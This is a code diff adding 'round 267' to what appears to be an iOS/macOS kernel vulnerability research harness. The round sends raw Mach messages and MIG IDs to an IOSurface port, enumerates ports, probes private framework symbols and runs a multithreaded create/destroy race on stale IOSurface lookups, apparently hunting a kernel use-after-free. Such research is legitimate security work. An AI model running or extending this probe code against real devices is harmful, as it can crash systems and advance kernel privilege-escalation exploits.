@@ -1742,6 +1742,393 @@ static volatile int r264_probed = 0;
  * Operations must go through traps, shared memory, or different client types. */
 static volatile int r265_probed = 0;
 
+/* r267: Direct Mach messaging to IOSurface port + port enumeration + targeted race.
+ * r266 showed trap 6/7 return differently when given the IOSurface Mach port
+ * (BadArgument instead of IPCError). The framework must use Mach IPC to bypass
+ * disabled IOConnectCallMethod. This round:
+ * Part 1: Probe IOSurface Mach port with raw mach_msg (various message IDs)
+ * Part 2: Enumerate Mach ports before/after IOSurfaceSetValue to find IPC port
+ * Part 3: dlsym probe for private IOSurface framework symbols
+ * Part 4: Targeted race with kernel-touching ops (Lock/Purgeable) on stale surfaces */
+static volatile int r267_probed = 0;
+static volatile int r267_race_stop = 0;
+static volatile uint64_t r267_lock_ok = 0, r267_lock_fail = 0;
+static volatile uint64_t r267_purg_ok = 0, r267_purg_fail = 0;
+static volatile uint64_t r267_tex_ok = 0, r267_tex_fail = 0;
+
+/* r267 destroyer: rapidly create/destroy surfaces */
+static void *r267_destroyer_fn(void *arg) {
+    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
+    uint64_t created = 0;
+    while (!r267_race_stop) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        created++;
+        IOSurfaceSetValue(s, CFSTR("r267k"), CFSTR("v"));
+        CFRelease(s);
+    }
+    rlog("    r267 destroyer: %llu created\n", created);
+    return NULL;
+}
+
+/* r267 ID tracker */
+static volatile uint32_t r267_last_ids[64];
+static volatile int r267_id_head = 0;
+
+static void *r267_id_tracker_fn(void *arg) {
+    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
+    while (!r267_race_stop) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+        int idx = __sync_fetch_and_add(&r267_id_head, 1) & 63;
+        r267_last_ids[idx] = sid;
+        IOSurfaceSetValue(s, CFSTR("r267k"), CFSTR("v"));
+        CFRelease(s);
+    }
+    return NULL;
+}
+
+/* r267 kernel-touching racer: perform kernel ops on looked-up surfaces */
+static void *r267_kernel_racer_fn(void *arg) {
+    int mode = (int)(uintptr_t)arg; /* 0=lock, 1=purgeable, 2=metal_tex */
+    uint64_t ops = 0, fails = 0;
+
+    /* For Metal texture creation */
+    id<MTLDevice> dev = NULL;
+    if (mode == 2) {
+        dev = MTLCreateSystemDefaultDevice();
+    }
+
+    while (!r267_race_stop) {
+        int idx = (r267_id_head - 1) & 63;
+        uint32_t sid = r267_last_ids[idx];
+        if (!sid) continue;
+
+        IOSurfaceRef s = IOSurfaceLookup(sid);
+        if (!s) { fails++; continue; }
+
+        if (mode == 0) {
+            /* Lock the surface — kernel operation */
+            kern_return_t kr = IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
+            if (kr == 0) {
+                ops++;
+                void *base = IOSurfaceGetBaseAddress(s);
+                if (base) {
+                    volatile uint8_t v = ((volatile uint8_t*)base)[0];
+                    (void)v;
+                }
+                IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
+            } else {
+                fails++;
+            }
+        } else if (mode == 1) {
+            /* Purgeable state toggle — kernel VM operation */
+            uint32_t old = 0;
+            kern_return_t kr = IOSurfaceSetPurgeable(s, 1, &old);
+            if (kr == 0) {
+                ops++;
+                IOSurfaceSetPurgeable(s, 0, &old);
+            } else {
+                fails++;
+            }
+        } else if (mode == 2 && dev) {
+            /* Create Metal texture from surface — AGX kernel operation */
+            MTLTextureDescriptor *desc = [MTLTextureDescriptor
+                texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
+                width:IOSurfaceGetWidth(s)
+                height:IOSurfaceGetHeight(s)
+                mipmapped:NO];
+            desc.usage = MTLTextureUsageShaderRead;
+            desc.storageMode = MTLStorageModeShared;
+            id<MTLTexture> tex = [(id<MTLDevice>)dev
+                newTextureWithDescriptor:desc
+                iosurface:(__bridge IOSurfaceRef)s
+                plane:0
+                slice:0];
+            if (tex) {
+                ops++;
+                tex = nil;
+            } else {
+                fails++;
+            }
+        }
+        CFRelease(s);
+    }
+
+    if (mode == 0) { __sync_fetch_and_add(&r267_lock_ok, ops); __sync_fetch_and_add(&r267_lock_fail, fails); }
+    else if (mode == 1) { __sync_fetch_and_add(&r267_purg_ok, ops); __sync_fetch_and_add(&r267_purg_fail, fails); }
+    else { __sync_fetch_and_add(&r267_tex_ok, ops); __sync_fetch_and_add(&r267_tex_fail, fails); }
+
+    rlog("    r267 kernel_racer mode=%d: ops=%llu fails=%llu\n", mode, ops, fails);
+    return NULL;
+}
+
+static void r267_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+    kern_return_t kr;
+
+    /* Part 1: Direct Mach messaging to IOSurface port */
+    rlog("\n=== r267 Part 1: Mach message probe to IOSurface port ===\n");
+    mach_port_t sp = IOSurfaceCreateMachPort(surf);
+    rlog("  IOSurface Mach port: %u (surfID=%u)\n", sp, sid);
+
+    /* Check port type */
+    mach_port_type_t ptype = 0;
+    kr = mach_port_type(mach_task_self(), sp, &ptype);
+    rlog("  mach_port_type: kr=0x%x type=0x%x", kr, ptype);
+    if (ptype & MACH_PORT_TYPE_SEND) rlog(" SEND");
+    if (ptype & MACH_PORT_TYPE_RECEIVE) rlog(" RECEIVE");
+    if (ptype & MACH_PORT_TYPE_SEND_ONCE) rlog(" SEND_ONCE");
+    if (ptype & MACH_PORT_TYPE_DEAD_NAME) rlog(" DEAD");
+    rlog("\n");
+
+    /* Create reply port */
+    mach_port_t rp = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rp);
+
+    /* Try sending messages with various IDs */
+    rlog("  Sending mach_msg with various IDs:\n");
+    for (int mid = 0; mid <= 20; mid++) {
+        struct {
+            mach_msg_header_t hdr;
+            uint32_t data[4];
+        } msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = sp;
+        msg.hdr.msgh_local_port = rp;
+        msg.hdr.msgh_id = mid;
+        msg.data[0] = sid;
+
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
+            MACH_PORT_NULL, 100, MACH_PORT_NULL);
+        rlog("    msg_id=%d send: kr=0x%x\n", mid, kr);
+
+        if (kr == KERN_SUCCESS) {
+            /* Try to receive a reply */
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t body[256];
+            } reply;
+            memset(&reply, 0, sizeof(reply));
+            kr = mach_msg(&reply.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                sizeof(reply), rp, 100, MACH_PORT_NULL);
+            rlog("    msg_id=%d recv: kr=0x%x", mid, kr);
+            if (kr == KERN_SUCCESS) {
+                rlog(" reply_id=%d size=%u", reply.hdr.msgh_id, reply.hdr.msgh_size);
+                uint32_t *rdata = (uint32_t*)reply.body;
+                for (int i = 0; i < 4 && i * 4 < (int)(reply.hdr.msgh_size - sizeof(mach_msg_header_t)); i++)
+                    rlog(" [%d]=0x%x", i, rdata[i]);
+            }
+            rlog("\n");
+        }
+    }
+
+    /* Try MIG-style message IDs (typically 2800-2900 range for IOKit) */
+    rlog("  MIG-style message IDs:\n");
+    int mig_ids[] = {2800, 2801, 2802, 2803, 2804, 2805, 2810, 2815, 2817, 2818,
+                     2820, 2850, 2860, 2861, 2862, 2863, 2864, 2865, 2900,
+                     3000, 3400, 3401, 3800, 3801, 4000, 4800, 4801};
+    for (int i = 0; i < (int)(sizeof(mig_ids)/sizeof(mig_ids[0])); i++) {
+        struct {
+            mach_msg_header_t hdr;
+            uint32_t data[8];
+        } msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = sp;
+        msg.hdr.msgh_local_port = rp;
+        msg.hdr.msgh_id = mig_ids[i];
+        msg.data[0] = sid;
+
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
+            MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS) {
+            rlog("    mid=%d: send=0x%x\n", mig_ids[i], kr);
+            continue;
+        }
+        struct {
+            mach_msg_header_t hdr;
+            uint8_t body[512];
+        } reply;
+        memset(&reply, 0, sizeof(reply));
+        kr = mach_msg(&reply.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+            sizeof(reply), rp, 200, MACH_PORT_NULL);
+        rlog("    mid=%d: send=OK recv=0x%x", mig_ids[i], kr);
+        if (kr == KERN_SUCCESS) {
+            rlog(" reply_id=%d size=%u", reply.hdr.msgh_id, reply.hdr.msgh_size);
+            uint32_t *rd = (uint32_t*)reply.body;
+            int words = (reply.hdr.msgh_size - sizeof(mach_msg_header_t)) / 4;
+            if (words > 8) words = 8;
+            for (int j = 0; j < words; j++)
+                rlog(" [%d]=0x%x", j, rd[j]);
+        }
+        rlog("\n");
+    }
+
+    mach_port_deallocate(mach_task_self(), rp);
+
+    /* Also try sending to the IOSurfaceRoot CONNECTION port (not the surface port) */
+    rlog("\n  --- Testing IOSurfaceRoot connection port ---\n");
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = IO_OBJECT_NULL;
+    IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (conn) {
+        /* Get the Mach port underlying the IOKit connection */
+        mach_port_t conn_port = conn; /* io_connect_t IS a mach_port_t */
+        ptype = 0;
+        kr = mach_port_type(mach_task_self(), conn_port, &ptype);
+        rlog("  conn port=%u type=0x%x", conn_port, ptype);
+        if (ptype & MACH_PORT_TYPE_SEND) rlog(" SEND");
+        rlog("\n");
+
+        IOServiceClose(conn);
+    }
+    IOObjectRelease(svc);
+
+    /* Part 2: Port enumeration to find framework IPC port */
+    rlog("\n=== r267 Part 2: Mach port enumeration ===\n");
+    {
+        mach_port_name_array_t names1 = NULL;
+        mach_msg_type_number_t count1 = 0;
+        mach_port_type_array_t types1 = NULL;
+        mach_msg_type_number_t tcount1 = 0;
+        kr = mach_port_names(mach_task_self(), &names1, &count1, &types1, &tcount1);
+        rlog("  Ports before IOSurfaceSetValue: count=%u\n", count1);
+
+        /* Call IOSurfaceSetValue — this communicates with kernel */
+        IOSurfaceSetValue(surf, CFSTR("r267_probe"), CFSTR("test"));
+
+        mach_port_name_array_t names2 = NULL;
+        mach_msg_type_number_t count2 = 0;
+        mach_port_type_array_t types2 = NULL;
+        mach_msg_type_number_t tcount2 = 0;
+        kr = mach_port_names(mach_task_self(), &names2, &count2, &types2, &tcount2);
+        rlog("  Ports after IOSurfaceSetValue: count=%u\n", count2);
+
+        /* Show send-right ports (likely IPC channels) */
+        rlog("  Send-right ports (potential IPC):\n");
+        int shown = 0;
+        for (uint32_t i = 0; i < count2 && shown < 30; i++) {
+            if (types2[i] & MACH_PORT_TYPE_SEND) {
+                rlog("    port=%u type=0x%x\n", names2[i], types2[i]);
+                shown++;
+            }
+        }
+
+        if (names1) vm_deallocate(mach_task_self(), (vm_address_t)names1, count1 * sizeof(mach_port_name_t));
+        if (types1) vm_deallocate(mach_task_self(), (vm_address_t)types1, count1 * sizeof(mach_port_type_t));
+        if (names2) vm_deallocate(mach_task_self(), (vm_address_t)names2, count2 * sizeof(mach_port_name_t));
+        if (types2) vm_deallocate(mach_task_self(), (vm_address_t)types2, count2 * sizeof(mach_port_type_t));
+
+        IOSurfaceRemoveValue(surf, CFSTR("r267_probe"));
+    }
+
+    /* Part 3: Private IOSurface framework symbol probe */
+    rlog("\n=== r267 Part 3: Private IOSurface symbols ===\n");
+    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+    if (iosfc) {
+        const char *syms[] = {
+            "_IOSurfaceGetConnection", "_IOSurfaceRootConnection",
+            "IOSurfaceRootUserClient", "_IOSurfaceSetNotify",
+            "_IOSurfaceRemoveNotify", "_IOSurfaceNotifyValues",
+            "IOSurfacePropertyListModify", "IOSurfacePropertyModify",
+            "_IOSurfaceClientSetValue", "_IOSurfaceClientCopyValue",
+            "IOSurfaceClientCreate", "IOSurfaceClientRelease",
+            "IOSurfaceClientLookup", "IOSurfaceClientLock",
+            "IOSurfaceClientUnlock", "IOSurfaceClientSetPurgeable",
+            "_IOSurfaceXPCSetValue", "_IOSurfaceXPCCopyValue",
+            "IOSurfaceSendRight", "IOSurfacePortForID",
+            "_IOSurfaceMachPortSend", "_IOSurfaceMachPortCallout",
+            "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
+            "_IOSurfaceGetMachPort", "_IOSurfaceSendMessage",
+            NULL
+        };
+        for (int i = 0; syms[i]; i++) {
+            void *p = dlsym(iosfc, syms[i]);
+            if (p) rlog("  FOUND: %s = %p\n", syms[i], p);
+        }
+
+        /* Also try common IOKit internal symbols */
+        void *iokitfw = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+        if (iokitfw) {
+            const char *iokit_syms[] = {
+                "IOConnectTrap3", "IOConnectTrap4", "IOConnectTrap5",
+                "IOConnectCallAsyncStructMethod", "IOConnectCallAsyncScalarMethod",
+                "io_connect_method", "io_connect_async_method",
+                "_IOServiceRequestProbe", "IOConnectAddClient",
+                NULL
+            };
+            for (int i = 0; iokit_syms[i]; i++) {
+                void *p = dlsym(iokitfw, iokit_syms[i]);
+                if (p) rlog("  IOKit FOUND: %s = %p\n", iokit_syms[i], p);
+            }
+            dlclose(iokitfw);
+        }
+        dlclose(iosfc);
+    } else {
+        rlog("  Cannot open IOSurface framework\n");
+    }
+
+    /* Part 4: Targeted kernel race (8 seconds) */
+    rlog("\n=== r267 Part 4: Kernel-touching race (8s) ===\n");
+    rlog("  Racing create/destroy + Lock/Purgeable/MetalTex on stale lookups\n");
+
+    int w = 32, h = 32, bpe = 4, bpr = w * bpe, pf = 0x42475241, as = bpr * h;
+    CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
+    CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);
+
+    memset((void*)r267_last_ids, 0, sizeof(r267_last_ids));
+    r267_race_stop = 0;
+    r267_id_head = 0;
+    r267_lock_ok = r267_lock_fail = r267_purg_ok = r267_purg_fail = 0;
+    r267_tex_ok = r267_tex_fail = 0;
+
+    pthread_t threads[12];
+    int tc = 0;
+    pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
+    /* Kernel-touching racers: mode 0=lock, 1=purgeable, 2=metal */
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);
+    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);
+
+    sleep(8);
+    r267_race_stop = 1;
+    for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);
+
+    rlog("  Lock: ok=%llu fail=%llu\n", r267_lock_ok, r267_lock_fail);
+    rlog("  Purgeable: ok=%llu fail=%llu\n", r267_purg_ok, r267_purg_fail);
+    rlog("  MetalTex: ok=%llu fail=%llu\n", r267_tex_ok, r267_tex_fail);
+
+    CFRelease(rprops);
+    mach_port_deallocate(mach_task_self(), sp);
+    __sync_fetch_and_add(&r267_probed, 1);
+    fflush(stdout);
+}
+
 /* r266: Deep trap 6/7 probe (IPCError path), AGX type=1 selectors,
  * and multi-threaded framework API race.
  * Trap 6/7 returned kIOReturnIPCError (0xe00002bf) in r265 — different from
@@ -21584,6 +21971,41 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 267) {
+            rlog("*** rounds=267: Mach msg probe + port enum + private symbols + kernel race ***\n");
+            rlog("  IOSurface Mach port changes trap return code — probing direct Mach IPC\n\n");
+
+            int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+            int alloc_sz = bpr * h;
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+            IOSurfaceRef surf = IOSurfaceCreate(props);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            CFRelease(props);
+
+            if (surf) {
+                rlog("  Created test IOSurface: id=%u\n", IOSurfaceGetID(surf));
+                r267_probe(surf);
+                CFRelease(surf);
+            } else {
+                rlog("  FAIL: could not create test IOSurface\n");
+            }
+
+            rlog("*** r=267 complete ***\n");
             goto done;
         }
         if (rounds == 266) {
